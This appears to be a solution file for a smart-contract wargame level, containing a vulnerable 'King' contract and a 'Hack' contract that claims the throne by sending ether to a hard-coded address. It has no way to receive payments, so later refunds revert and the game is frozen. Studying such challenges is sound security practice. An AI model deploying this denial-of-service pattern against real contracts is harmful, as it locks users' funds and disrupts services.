// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }

  function getPrevKingPrice() public view returns(uint){

      return msg.sender.balance;
  }
}

contract Hack{


  address king = 0xA2aB8d41e9372792b09D51e3C60Cc0769Ed15197;

  function setToKing() public payable {

    //  king.call{value:msg.value}("");
   (   bool s ,bytes memory m)= king.call.value(msg.value)("");
   if(s){
     this;
   }
   else{
     revert();
   }
  }
}